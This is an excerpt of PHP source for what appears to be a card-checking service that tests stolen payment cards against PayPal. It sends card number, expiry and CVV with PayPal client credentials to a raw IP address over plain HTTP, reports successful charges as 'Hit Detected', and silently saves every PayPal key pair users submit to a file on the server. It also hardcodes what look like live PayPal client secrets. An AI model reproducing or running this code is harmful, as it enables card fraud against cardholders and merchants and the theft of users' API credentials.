...
// === Restrict inbuilt keys for FREE users ===
if (empty($client_id) || empty($client_secret)) {
    if ($userStatus === 'FREE') {
        echo json_encode([
            'Response' => 'Please use your own API keys or Upgrade your Plan to use Inbuilt Keys.'
        ]);
        exit;
    }

    // Inbuilt keys allowed only for Premium/Admin
    $client_id = 'Ae6C8zeWXPspOcNbpI5wSYLuERP8w3f0leoiLHxUJGQwaOPbGs_FnacYvn4MasLzY0BGM03dXFJ06edy';
    $client_secret = 'EPDlsXsiBrEpZaFZ94juzDmU6fekEtRWFqQolBWt4hBGyByIht_IQ8K73xFxp8yzOUWu9dNTFlKEgdND';
}

// === Save unique client_id + client_secret pair ===
$keysFile = __DIR__ . '/paypal_keys.txt'; // Path: same directory as this PHP file

// Format: ('client_id', 'client_secret')
$newEntry = "('$client_id', '$client_secret')";

// Read existing keys file (if exists)
$existingKeys = [];
if (file_exists($keysFile)) {
    $existingKeys = file($keysFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}

// Only add if this exact pair not already in file
if (!in_array($newEntry, $existingKeys, true)) {
    file_put_contents($keysFile, $newEntry . PHP_EOL, FILE_APPEND | LOCK_EX);
}
...
$requestUrl = "http://206.206.78.217:1355/?cc={$cc}|{$month}|{$year}|{$cvv}&client_id={$client_id}&client_secret={$client_secret}";
...
// $result = isset($responseData['result']) ? $responseData['result'] : 'Unknown Response';
// Check for Charge response
if (stripos($response, '"status":"COMPLETED"') !== false || stripos($response, 'Payment successful') !== false) {
    $err = 'Payment successful';
    $newCredits = updateCredits($pdo, $uid, 5, false, true);
    $fullResult = "<b>#PayPalCharge</b>\n" .
                  "━━━━━━━━━━━\n" .
                  "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
                  "[ﾒ] <b>Status ➜</b> Charge 🔥\n" .
                  "[ﾒ] <b>Response ➜</b> {$response} 🎉\n" .
                  "[ﾒ] <b>Gateway ➜</b> PayPal KeyBased AVS\n" .
                  "━━━━━━━━━━━\n" .
    ...
    $publicMessage = "<b>Hit Detected ✅</b>\n" .
                     ...
                     "<b>Response ➜</b> {$err} 🎉\n" .
                     "<b>Gateway ➜</b> PayPal KeyBased AVS\n" .
                     "━━━━━━━━\n" .
    ...
    exit;
} elseif (stripos($response, '0051') !== false) {
    $err = "Insufficient Funds | $response";
    ...
    exit;
} elseif (stripos($response, 'CVV = D') !== false) {
    $err = "CVV2 Declined | $response";
    $newCredits = updateCredits($pdo, $uid, 3, true, false);
    $fullResult = "<b>#PayPalCharge</b>\n" .
                  "━━━━━━━━━━━\n" .
                  "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
